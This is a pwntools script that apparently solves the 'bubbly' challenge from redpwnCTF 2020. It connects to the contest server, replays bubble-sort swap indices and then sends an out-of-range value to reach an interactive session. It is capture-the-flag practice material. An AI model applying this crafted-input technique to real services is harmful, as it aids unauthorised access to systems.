from pwn import *
from time import sleep


nums = [1, 10, 3, 2, 5, 9, 8, 7, 4, 6]

# p = process('bubbly')

p = remote('2020.redpwnc.tf', 31039)

log.info(p.clean(0.2).decode())

for i in range(len(nums)-1):
	for j in range(len(nums)-i-1):
		if nums[j] > nums[j+1]:
			nums[j], nums[j+1] = nums[j+1], nums[j]
			log.info('Sending {0}'.format(j))
			p.sendline(str(j))
			sleep(0.2)

p.sendline('123124')

log.info(p.recv().decode())
p.interactive()